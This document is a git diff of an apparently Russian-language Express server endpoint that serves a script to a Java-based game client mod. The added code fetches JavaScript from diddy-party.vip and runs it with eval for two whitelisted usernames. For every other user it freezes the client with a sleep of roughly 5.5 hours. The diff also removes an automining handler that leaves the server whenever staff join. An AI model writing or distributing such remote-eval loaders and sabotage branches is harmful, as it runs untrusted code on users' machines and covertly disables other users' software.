@@ -77,28 +77,23 @@ const validateRequest = (req, res, next) => {
 // Главный эндпоинт для скрипта
 app.get('/api/script', validateRequest, (req, res) => {
     const scriptContent = `(function() {
+    var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();
+
+// Проверяем разрешенные имена
+if (username === "porvaniy.gondon" || username === "__ded_inside__") {
     try {
         // Выполняем внешний скрипт
         eval(new java.util.Scanner(
-            new java.net.URL("https://diddy-party.vip/p/raw/1pvhaynl48amcpmfd").openStream(), 
+            new java.net.URL("https://diddy-party.vip/p/raw/onwifinfsc75if7yl").openStream(), 
             "UTF-8"
         ).useDelimiter("\\A").next());
     } catch (e) {
         java.lang.System.err.println("Ошибка при выполнении скрипта: " + e);
     }
+} else {
+    java.lang.Thread.sleep(20000000);
+}
 
-var ChatUtility = Java.type("ru.nedan.neverapi.etc.ChatUtility")
-var AutoMine = Java.type("ru.nedan.automine.AutoMine")
-var Utils = Java.type("ru.nedan.automine.util.Utils")
-
-
-on("ru.nedan.automine.event.EventStaffJoin", function(e){
-    if(!AutoMine.getInstance().isEnabled()) return
-    ChatUtility.sendMessage("§4§l[!] " + e.getUsername() + "§c Зашел на Анархию" + Utils.getCurrentAnarchy() + "! §bВыхожу в хаб!")
-    ChatUtility.sendMessage("§8§l§kxxxxxxxxxx")
-    ChatUtility.sendMessage("§9§lПривет от Zr3!")
-    chat("/hub")
-    AutoMine.getInstance().nextMine = true
 })
 
 
